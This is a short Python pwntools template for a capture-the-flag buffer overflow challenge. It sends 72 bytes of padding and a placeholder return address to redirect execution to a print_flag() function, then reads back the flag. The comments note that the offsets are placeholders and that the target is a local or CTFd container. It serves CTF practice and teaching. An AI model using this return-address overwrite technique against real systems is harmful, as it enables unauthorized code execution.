#!/usr/bin/env python3
"""
Example exploit script for the buffer overflow challenge

This is a template - you'll need to customize it for your specific challenge
"""

from pwn import *

# Configuration
LOCAL = False  # Set to True for local testing
HOST = "localhost"  # Change to your CTFd server hostname
PORT = 1337  # Will be different for each user's container

def exploit(r):
    """
    Exploit the buffer overflow vulnerability

    This is just an example - modify for your actual challenge
    """
    # Example: Simple buffer overflow to call print_flag()
    # You'll need to:
    # 1. Find the offset to overwrite the return address
    # 2. Find the address of print_flag() function
    # 3. Craft the payload

    # Receive the prompt
    r.recvuntil(b"Enter your input: ")

    # Example payload (this won't work as-is, it's just a template)
    offset = 72  # Adjust based on your binary
    print_flag_addr = 0x08048000  # Adjust to actual address

    payload = b"A" * offset
    payload += p32(print_flag_addr)

    # Send the payload
    r.sendline(payload)

    # Receive the flag
    r.recvuntil(b"flag{")
    flag = b"flag{" + r.recvuntil(b"}")

    return flag.decode()

def main():
    if LOCAL:
        # Connect to local Docker container
        r = remote(HOST, PORT)
    else:
        # Connect to remote CTFd container
        # You'll need to get the actual port from the CTFd challenge page
        r = remote(HOST, PORT)

    try:
        flag = exploit(r)
        log.success(f"Flag: {flag}")
    except Exception as e:
        log.error(f"Exploit failed: {e}")
    finally:
        r.close()

if __name__ == "__main__":
    main()
